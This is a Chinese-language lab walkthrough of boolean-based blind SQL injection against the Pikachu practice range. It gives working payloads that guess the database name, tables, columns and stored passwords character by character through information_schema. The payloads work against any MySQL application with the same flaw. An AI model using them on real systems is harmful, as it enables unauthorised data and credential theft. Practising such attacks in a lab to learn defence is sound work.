kobe') and 1=2 and ('1'='1
您输入的 username 不存在，请重新输入！
kobe') and 1=1 and ('1'='1
your uid:3your email is: kobe@pikachu.com

```
kobe') and 【注入语句】 and ('1'='1
```

## 1. 爆数据库名长度

```
kobe') and length(database())=7 and ('1'='1
```

返回 kobe，证明数据库名字长度就是 7。

## 2. 逐字符猜库名 substr (字符串，起始位置，截取长度)，位置从 1 开始

猜第 1 位：

```
kobe') and ascii(substr(database(),1,1))=112 and ('1'='1
```

112 = `p`，页面返回 kobe，正确。

第 2 位：

```
kobe') and ascii(substr(database(),2,1))=105 and ('1'='1
```

105 = `i`

以此类推，最终得到数据库名：`pikachu`

## 3. 爆表名

查询当前库第一张表：

```
kobe') and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=109 and ('1'='1
```

`limit 0,1` → 第 0 行第一张表；`limit 1,1`第二张表。
靶场有用的表：`member`

## 4. 爆列名 (member 表)

```
kobe') and ascii(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='member' limit 0,1),1,1))=105 and ('1'='1
```

member 核心字段：`id`、`username`、`pw`、`email`

## 5. 爆账号密码数据

第一条用户密码第一位：

```
kobe') and ascii(substr((select pw from member limit 0,1),1,1))=xx and ('1'='1
```